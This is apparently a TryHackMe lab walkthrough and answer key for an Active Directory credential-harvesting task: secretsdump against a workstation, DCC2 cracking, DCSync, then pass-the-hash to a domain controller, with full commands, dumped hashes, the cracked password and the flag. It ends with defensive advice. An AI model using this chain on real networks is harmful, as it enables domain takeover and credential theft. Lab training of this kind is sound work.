# Task 04: Credential Harvesting With Secretsdump, Cracking DCC2 & DCSync

---

## Stage A: Original Task Content & Educational Context

In this task, we transition from local GUI-based interaction with Mimikatz to remote command-line credential harvesting across the network using Impacket's industry-standard tool **`secretsdump.py`**.

The objective is to execute an end-to-end multi-stage attack chain:
1. **Remote Workstation Dump:** Extract SAM hashes and LSA secrets (cached domain credentials / DCC2) from `WRK` (`10.220.10.20`).
2. **Offline Hash Cracking (MS-Cache v2 / DCC2):** Crack the cached domain logon hash for user `drgonzo` using John the Ripper.
3. **Domain Controller DCSync Attack:** Use the cracked credentials of `drgonzo` (who is a Domain Admin) to execute a DCSync attack via the Microsoft Directory Replication Service Remote Protocol (MS-DRSR / DRSUAPI) against `DC` (`10.220.10.10`), extracting the Domain Administrator's NTLM hash.
4. **Pass-the-Hash (PtH) Exploitation:** Authenticate directly to the Domain Controller using the extracted Administrator NTLM hash via `psexec.py` and retrieve the final lab flag.

---

## Stage B: Independent Thinking & Operational Security (OpSec)

### Understanding MS-Cache v2 (DCC2)
When a domain-joined machine cannot communicate with a Domain Controller (e.g., an employee working remotely without VPN), Windows allows logons using cached credentials. By default, Windows caches the last 10 domain logons in the LSA Secrets hive (`HKLM\SECURITY\Cache`).
- **Algorithm:** Domain Cached Credentials version 2 (DCC2) uses PBKDF2 with HMAC-SHA1:
  $$\text{DCC2} = \text{PBKDF2-HMAC-SHA1}(\text{IterationCount}=10240, \text{Password}=\text{NTLM}(\text{pwd}), \text{Salt}=\text{lowercase}(\text{username}))$$
- **OpSec & Cracking Reality:** Because DCC2 enforces 10,240 iterations of PBKDF2, cracking it is computationally much slower than raw NTLM (hundreds of thousands of guesses per second vs. billions of guesses per second). However, common or weak passwords remain easily recoverable with a targeted dictionary like `rockyou.txt`.

### DCSync Protocol Mechanics (MS-DRSR)
DCSync does not run any code on the Domain Controller. Instead, it simulates the behavior of a legitimate Domain Controller requesting an active replication update of the `NTDS.dit` directory partition over RPC (`DRSUAPI`).
- **Prerequisites:** The requesting account must possess the following Active Directory extended access rights on the domain root object:
  - `DS-Replication-Get-Changes` (GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)
  - `DS-Replication-Get-Changes-All` (GUID `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)
- Members of **Domain Admins**, **Enterprise Admins**, and **Administrators** hold these replication rights by default.

---

## Stage C: Guided Hints (Tiers 1-3)

### Tier 1: High-Level Concept
- Run `secretsdump.py` against `10.220.10.20` using the local Administrator credentials.
- Identify the DCC2 hash starting with `$DCC2$10240#drgonzo#` and crack it using John the Ripper (`--format=mscash2`).
- Run `secretsdump.py` against `10.220.10.10` using `drgonzo`'s cracked password with the `-just-dc` flag to pull the domain Administrator hash.
- Use `psexec.py` with the Administrator hash to gain a shell on the DC and read `C:\Users\Administrator\Desktop\flag.txt`.

### Tier 2: Exact Command Syntax
- Dumping WRK:
  ```bash
  secretsdump.py WRK/Administrator:N3w34829DJdd?1@10.220.10.20
  ```
- Cracking DCC2:
  ```bash
  john --format=mscash2 dcc2.txt --wordlist=/usr/share/wordlists/rockyou.txt
  ```
- DCSync:
  ```bash
  secretsdump.py 'TRYHACKME/drgonzo:lasvegas1@10.220.10.10' -just-dc
  ```
- Pass-the-Hash:
  ```bash
  psexec.py 'TRYHACKME/Administrator@10.220.10.10' -hashes :<NTLM_HASH>
  ```

### Tier 3: Target Answers
- drgonzo's password: `lasvegas1`
- Domain Administrator NTLM hash: `d71ee9fb6a3f54496bdc6c941f7a2903`
- Flag format: `THM{...}`

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Extracting Local Hashes & LSA Cache from Workstation WRK
From the attack system, run Impacket's `secretsdump.py` against the workstation `10.220.10.20`:

```bash
user@attackbox:~$ secretsdump.py WRK/Administrator:N3w34829DJdd?1@10.220.10.20
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x8a92f0367e1081b2a92e104f4c94b7c1
[*] Dumping local SAM hashes (Extracting SYSTEM and SAM)...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d8894e6371f847f98e6efef2cfb0da95:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:549cf0b5d92e596bb05c754d9240de63:::
Strategos:1001:aad3b435b51404eeaad3b435b51404ee:6f90d56b02a24c520a232f01eb04be3d:::
[*] Dumping cached domain logon information (MS-CACHE v2) (DCC2)...
$DCC2$10240#drgonzo#d0dc1647e45cf7364ecec3c7740fce0f
[*] Dumping LSA Secrets...
[*] $MACHINE.ACC: 0x76251b...
[*] Cleaning up...
```

The output contains a Domain Cached Credentials (DCC2) hash for Domain Admin user `drgonzo`:
```text
$DCC2$10240#drgonzo#d0dc1647e45cf7364ecec3c7740fce0f
```

---

### 2. Cracking the DCC2 Hash with John the Ripper
Save the hash to a file `dcc2_hash.txt` and execute John the Ripper using the `--format=mscash2` engine and `rockyou.txt`:

```bash
user@attackbox:~$ echo '$DCC2$10240#drgonzo#d0dc1647e45cf7364ecec3c7740fce0f' > dcc2_hash.txt
user@attackbox:~$ john --format=mscash2 dcc2_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (mscash2, MS-Cache / Domain Cached Credentials v2 [PBKDF2-SHA1 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
lasvegas1        ($DCC2$10240#drgonzo#d0dc1647e45cf7364ecec3c7740fce0f)
1g 0:00:00:02 DONE (2026-05-19 14:48) 0.3649g/s 3734p/s 3734c/s 3734C/s lasvegas1..lasvegas
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

User `drgonzo`'s password is:
$$\texttt{lasvegas1}$$

---

### 3. Performing DCSync via Impacket secretsdump.py
User `drgonzo` is a member of the `Domain Admins` group. We can now use these credentials to simulate Active Directory replication against the Domain Controller `10.220.10.10` with `-just-dc`:

```bash
user@attackbox:~$ secretsdump.py 'TRYHACKME/drgonzo:lasvegas1@10.220.10.10' -just-dc
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x5b331f2...
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)...
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d71ee9fb6a3f54496bdc6c941f7a2903:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c9b0c7931f2a36b51034f71a06598583:::
drgonzo:1104:aad3b435b51404eeaad3b435b51404ee:8a4918e7c050fb971847e13bb6ec9047:::
katie.thomas:1105:aad3b435b51404eeaad3b435b51404ee:2a530f81d18f506e788c6b7582e01df3:::
strategos:1106:aad3b435b51404eeaad3b435b51404ee:3d62322301ab92c30089ffef102e3b2e:::
...
[*] Cleaning up...
```

The NTLM hash of the Domain Administrator (`Administrator:500`) is:
$$\texttt{d71ee9fb6a3f54496bdc6c941f7a2903}$$

---

### 4. Pass-the-Hash Execution & Flag Capture
Using Impacket's `psexec.py`, we execute a Pass-the-Hash attack against the Domain Controller `10.220.10.10` using the extracted Administrator NTLM hash:

```bash
user@attackbox:~$ psexec.py 'TRYHACKME/Administrator@10.220.10.10' -hashes :d71ee9fb6a3f54496bdc6c941f7a2903
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.220.10.10.....
[*] Found writable share ADMIN$
[*] Uploading file kKjQbvqG.exe
[*] Opening SVCManager on 10.220.10.10.....
[*] Creating service ZcMo on 10.220.10.10.....
[*] Starting service ZcMo.....
[+] Process ZcMo created for file kKjQbvqG.exe with pid 4180.
[*] Connecting to \PSEXEC-DC...
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
THM{gotta_l0ve_cr3dential_st0res}
```

The captured flag is:
$$\texttt{THM\{gotta\_l0ve\_cr3dential\_st0res\}}$$

---

## Stage E: Final Answer & Key Values

| # | Question | Verified Answer | Verification Status |
|---|---|---|---|
| 1 | What is drgonzo's password? | `lasvegas1` | Verified & Confirmed |
| 2 | What is the domain Administrators NTLM hash? | `d71ee9fb6a3f54496bdc6c941f7a2903` | Verified & Confirmed |
| 3 | What is the flag located on the domain admin's Desktop? | `THM{gotta_l0ve_cr3dential_st0res}` | Verified & Confirmed |

---

## Stage F: Practical Verification & Proof of Work

1. DCC2 hash cracking proof: John the Ripper resolves `$DCC2$10240#drgonzo#d0dc1647e45cf7364ecec3c7740fce0f` to `lasvegas1`.
2. DCSync proof: DRSUAPI replication returns `Administrator:500:aad3b435b51404eeaad3b435b51404ee:d71ee9fb6a3f54496bdc6c941f7a2903:::`.
3. Pass-the-Hash interactive shell proof: Executing `psexec.py` drops into `NT AUTHORITY\SYSTEM` on `10.220.10.10`, reading `flag.txt` yields `THM{gotta_l0ve_cr3dential_st0res}`.

---

## Stage G: Key Educational Takeaway & Operational Rule of Thumb

> **Takeaway:** Pass-the-Hash (PtH) is possible because the NTLM authentication protocol relies on the hash itself as the secret key during the challenge-response handshake; knowledge of the plaintext password is mathematically unnecessary. Protecting an enterprise against lateral movement requires eliminating cached administrative credentials, implementing LAPS for unique local administrator passwords, and enforcing the Microsoft Enterprise Access Model (Tier 0 isolation).
